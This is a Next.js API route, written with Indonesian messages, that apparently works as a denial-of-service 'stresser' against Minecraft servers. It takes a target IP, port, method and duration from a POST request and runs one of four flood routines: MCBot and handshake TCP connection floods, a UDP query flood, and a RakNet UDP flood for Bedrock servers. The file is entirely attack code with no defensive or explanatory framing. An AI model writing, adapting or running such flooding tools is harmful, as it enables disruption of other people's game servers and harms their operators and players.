import { NextResponse } from "next/server";
import dgram from "dgram";
import net from "net";

export async function POST(req) {
    try {
        const { serverIp, serverPort, method, duration } = await req.json();
        const attackDuration = parseInt(duration) * 1000; // Convert ke milidetik
        const endTime = Date.now() + attackDuration;

        if (!serverIp || !serverPort || !method) {
            return NextResponse.json({ message: "Input tidak valid!" }, { status: 400 });
        }

        switch (method) {
            case "mcbot":
                runMCBotAttack(serverIp, serverPort, endTime);
                break;
            case "handshake":
                runHandshakeFlood(serverIp, serverPort, endTime);
                break;
            case "query":
                runQueryFlood(serverIp, serverPort, endTime);
                break;
            case "raknet":
                runRakNetFlood(serverIp, serverPort, endTime);
                break;
            default:
                return NextResponse.json({ message: "Metode tidak valid!" }, { status: 400 });
        }

        return NextResponse.json({ message: "Serangan dimulai!" });

    } catch (error) {
        return NextResponse.json({ message: "Terjadi kesalahan!" }, { status: 500 });
    }
}

// MCBOT Attack
function runMCBotAttack(ip, port, endTime) {
    while (Date.now() < endTime) {
        try {
            const client = new net.Socket();
            client.connect(port, ip, () => {
                client.write("\x0f");
                client.destroy();
            });
        } catch (err) {}
    }
}

// Handshake Flood
function runHandshakeFlood(ip, port, endTime) {
    while (Date.now() < endTime) {
        try {
            const client = new net.Socket();
            client.connect(port, ip, () => {
                client.write("\x00\x00\x0f");
                client.destroy();
            });
        } catch (err) {}
    }
}

// Query Flood
function runQueryFlood(ip, port, endTime) {
    const client = dgram.createSocket("udp4");
    while (Date.now() < endTime) {
        try {
            const message = Buffer.from("\xFE\xFD\x09\x00\x00\x00\x00");
            client.send(message, port, ip);
        } catch (err) {}
    }
    client.close();
}

// RakNet Flood (Bedrock)
function runRakNetFlood(ip, port, endTime) {
    const client = dgram.createSocket("udp4");
    while (Date.now() < endTime) {
        try {
            const message = Buffer.alloc(24, Math.random() * 255);
            client.send(message, port, ip);
        } catch (err) {}
    }
    client.close();
        }
